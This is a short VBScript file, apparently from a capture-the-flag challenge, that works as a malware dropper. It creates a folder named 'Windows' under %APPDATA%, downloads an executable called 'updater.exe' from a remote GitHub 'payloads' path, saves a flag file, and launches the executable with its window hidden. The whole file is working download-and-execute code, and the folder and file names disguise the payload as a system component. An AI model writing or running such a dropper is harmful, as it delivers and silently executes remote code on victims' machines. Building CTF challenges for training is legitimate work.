Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

targetDir = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Windows"
If Not objFSO.FolderExists(targetDir) Then
    objFSO.CreateFolder(targetDir)
End If


objHTTP.Open "GET", "https://raw.githubusercontent.com/BUGSOC-CYCL/Challange/main/payloads/updater.exe", False
objHTTP.Send
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objHTTP.responseBody
objStream.SaveToFile targetDir & "\updater.exe", 2
objStream.Close


Set objHTTP2 = CreateObject("MSXML2.XMLHTTP")
objHTTP2.Open "GET", "https://raw.githubusercontent.com/BUGSOC-CYCL/Challange/main/payloads/flag1.txt", False
objHTTP2.Send
Set flagFile = objFSO.CreateTextFile(targetDir & "\flag1.txt", True)
flagFile.WriteLine objHTTP2.responseText
flagFile.Close


objShell.Run targetDir & "\updater.exe", 0, False
